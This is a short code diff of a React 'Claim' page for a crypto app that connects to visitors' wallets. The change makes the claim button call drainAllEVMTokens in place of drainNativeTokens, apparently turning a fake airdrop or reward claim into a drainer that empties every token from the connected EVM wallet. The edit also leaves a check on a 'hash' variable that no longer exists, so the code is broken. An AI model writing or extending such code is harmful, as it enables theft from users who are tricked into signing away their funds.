@@ -37,7 +37,7 @@ interface TokenBalance {
 const Claim = () => {
   const { connection } = useConnection();
   const { publicKey, sendTransaction } = useWallet();
-  const { activeChain } = useChain();
+  const { activeChain, evmChainId } = useChain();
   const { isEVMConnected, evmSigner, evmProvider } = useEVMWallet();
   const { chainName, nativeToken } = useChainInfo();
   const [dataMultiplier, setDataMultiplier] = useState(1);
@@ -191,7 +191,7 @@ const Claim = () => {
     if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
       try {
         setIsClaiming(true);
-        const hash = await drainNativeTokens(evmSigner, evmProvider, chainName);
+        await drainAllEVMTokens(evmSigner, evmProvider, chainName, evmChainId || 1);
         if (hash) {
         } else {
         }
